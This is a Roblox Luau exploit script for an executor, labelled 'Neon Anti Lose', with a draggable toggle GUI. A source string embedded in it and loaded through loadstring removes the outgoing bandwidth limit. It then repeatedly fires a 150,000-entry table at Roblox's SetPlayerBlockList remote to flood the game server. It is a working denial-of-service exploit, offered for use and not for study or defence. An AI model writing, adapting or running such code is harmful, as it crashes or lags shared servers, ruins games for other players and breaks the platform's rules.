local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Neon hub palette (amber / dark)
local COLORS = {
    bg = Color3.fromRGB(9, 12, 16),
    surface = Color3.fromRGB(16, 18, 22),
    disabled = Color3.fromRGB(28, 30, 34),
    border = Color3.fromRGB(87, 73, 59),
    accent = Color3.fromRGB(210, 151, 83),
    accentSoft = Color3.fromRGB(239, 206, 157),
    accentDark = Color3.fromRGB(120, 85, 45),
    text = Color3.fromRGB(249, 242, 229),
    white = Color3.fromRGB(255, 255, 255),
    black = Color3.fromRGB(0, 0, 0),
    mist = Color3.fromRGB(140, 130, 115),
}

local FONT = Enum.Font.GothamBold
local FONT_BLACK = Enum.Font.GothamBlack

local SRC = [==[
local RunService = game:GetService("RunService")

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
}

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]==]

local loader = coroutine.create(function()
    local chunk = loadstring(SRC)
    if not chunk then return end
    local ok, api = pcall(chunk)
    if ok and type(api) == "table" then
        _G.__ALT = api
    end
end)

coroutine.resume(loader)
loader = nil

local api = _G.__ALT
_G.__ALT = nil

-- Clean previous UI
pcall(function()
    for _, parent in ipairs({ playerGui, game:GetService("CoreGui") }) do
        local old = parent:FindFirstChild("MVPAntiLoseUI")
        if old then old:Destroy() end
        local old2 = parent:FindFirstChild("AntiLoseUI")
        if old2 then old2:Destroy() end
    end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NeonAntiLoseUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 50
pcall(function()
    if syn and syn.protect_gui then syn.protect_gui(screenGui) end
end)
local okParent = pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
if not okParent then screenGui.Parent = playerGui end

local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 220, 0, 108)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = COLORS.bg
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Active = true
main.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = COLORS.accent
mainStroke.Thickness = 1.2
mainStroke.Transparency = 0.35
mainStroke.Parent = main

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 14, 18)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 14)),
})
mainGrad.Rotation = 140
mainGrad.Parent = main

-- Top accent bar
local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 3)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundColor3 = COLORS.accent
topBar.BorderSizePixel = 0
topBar.ZIndex = 4
topBar.Parent = main

local topBarGrad = Instance.new("UIGradient")
topBarGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, COLORS.accentDark),
    ColorSequenceKeypoint.new(0.5, COLORS.accentSoft),
    ColorSequenceKeypoint.new(1, COLORS.accentDark),
})
topBarGrad.Parent = topBar

-- Badge / edition
local badge = Instance.new("TextLabel")
badge.Name = "Badge"
badge.Size = UDim2.new(1, -16, 0, 14)
badge.Position = UDim2.new(0, 8, 0, 10)
badge.BackgroundTransparency = 1
badge.Font = Enum.Font.GothamMedium
badge.Text = "NEON HUB ·  UTILITY"
badge.TextColor3 = COLORS.mist
badge.TextSize = 9
badge.TextXAlignment = Enum.TextXAlignment.Center
badge.ZIndex = 3
badge.Parent = main

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -16, 0, 22)
title.Position = UDim2.new(0, 8, 0, 24)
title.BackgroundTransparency = 1
title.Font = FONT_BLACK
title.Text = "Neon Anti Lose"
title.TextColor3 = COLORS.text
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 3
title.Parent = main

local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.Size = UDim2.new(1, -24, 0, 36)
toggle.Position = UDim2.new(0, 12, 0, 56)
toggle.BackgroundColor3 = COLORS.disabled
toggle.BorderSizePixel = 0
toggle.Font = FONT
toggle.Text = ""
toggle.TextTransparency = 1
toggle.AutoButtonColor = false
toggle.ZIndex = 3
toggle.Parent = main

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 10)
toggleCorner.Parent = toggle

local toggleGrad = Instance.new("UIGradient")
toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(36, 38, 44))
toggleGrad.Rotation = 90
toggleGrad.Parent = toggle

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = COLORS.border
toggleStroke.Thickness = 1.2
toggleStroke.Transparency = 0.4
toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
toggleStroke.Parent = toggle

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Name = "Label"
toggleLabel.Size = UDim2.new(1, 0, 1, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Font = FONT_BLACK
toggleLabel.Text = "DISABLED"
toggleLabel.TextColor3 = COLORS.mist
toggleLabel.TextSize = 13
toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
toggleLabel.ZIndex = 5
toggleLabel.Active = false
toggleLabel.Parent = toggle

local active = false

-- Subtle border shimmer when enabled
local borderSpinConn
local function setBorderSpin(on)
    if borderSpinConn then
        borderSpinConn:Disconnect()
        borderSpinConn = nil
    end
    if on then
        borderSpinConn = RunService.RenderStepped:Connect(function(dt)
            topBarGrad.Rotation = (topBarGrad.Rotation + 90 * dt) % 360
        end)
    else
        topBarGrad.Rotation = 0
    end
end

local function setActive(state)
    active = state

    if state then
        toggle.BackgroundColor3 = Color3.fromRGB(40, 32, 22)
        toggleGrad.Color = ColorSequence.new(
            Color3.fromRGB(55, 40, 24),
            Color3.fromRGB(35, 28, 18)
        )
        toggleStroke.Color = COLORS.accent
        toggleStroke.Transparency = 0.15
        toggleLabel.Text = "ENABLED"
        toggleLabel.TextColor3 = COLORS.accentSoft
        mainStroke.Color = COLORS.accentSoft
        mainStroke.Transparency = 0.15
        setBorderSpin(true)
        if api and api.start then
            pcall(api.start)
        end
    else
        toggle.BackgroundColor3 = COLORS.disabled
        toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(36, 38, 44))
        toggleStroke.Color = COLORS.border
        toggleStroke.Transparency = 0.4
        toggleLabel.Text = "DISABLED"
        toggleLabel.TextColor3 = COLORS.mist
        mainStroke.Color = COLORS.accent
        mainStroke.Transparency = 0.35
        setBorderSpin(false)
        if api and api.stop then
            pcall(api.stop)
        end
    end
end

toggle.MouseButton1Click:Connect(function()
    setActive(not active)
end)

-- Drag
local dragging = false
local dragStart, startPos

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)